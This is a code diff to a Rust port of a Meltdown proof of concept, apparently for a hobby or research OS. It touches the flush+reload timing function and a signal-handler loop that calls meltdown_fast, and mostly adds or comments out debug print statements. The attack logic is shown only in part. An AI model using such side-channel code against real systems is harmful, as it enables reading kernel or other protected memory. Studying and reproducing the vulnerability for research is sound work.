@@ -89,6 +89,8 @@ pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bo
     
     flush(pointer); // The entry is probably cached now no matter whether it was cached before, flush it so we don't expell the entry we are looking for from the cache by caching all other entries
     
+    //println!("load took {}, threshold is {}", end_time - start_time, cache_miss_threshold);
+    
     end_time - start_time < cache_miss_threshold
 }
 
@@ -117,6 +119,7 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 			if setjmp(&mut *jump_buf.lock()) == 0 {
 				meltdown_fast(mem, pointer);
 			} else {
+				println!("Continuing after signal handler!");
 				jump_buf.force_unlock();
 			}
 		}
@@ -124,15 +127,20 @@ pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, 
 		for i in 0..mem.len() {
 			if flush_reload(cache_miss_threshold, &mem[i] as *const MemoryPage) {
 				if i >= 1 { // TODO why ignore first entry?
+					//println!("cached value found: {}", i);
 					return i;
+				} else {
+					//println!("cached value found, but ignoring {}", i);
 				}
+			} else {
+				//println!("value {} not cached", i);
 			}
 			syscall(ThreadSwitch, &[]); // Apparently, switching threads here is important, as otherwise always the second or third entry gets returned, TODO find out why
 		}
 		syscall(ThreadSwitch, &[]); // Apparently this is important, see above
-		if iteration % 10 == 9 {
+		//if iteration % 10 == 9 {
 			println!("Iteration {} done!", iteration);
-		}
+		//}
 	}
 	println!("All values were 0");
 	return 0; // Maybe this means to only return 0 (first entry) after ensuring it was not one of the other values?
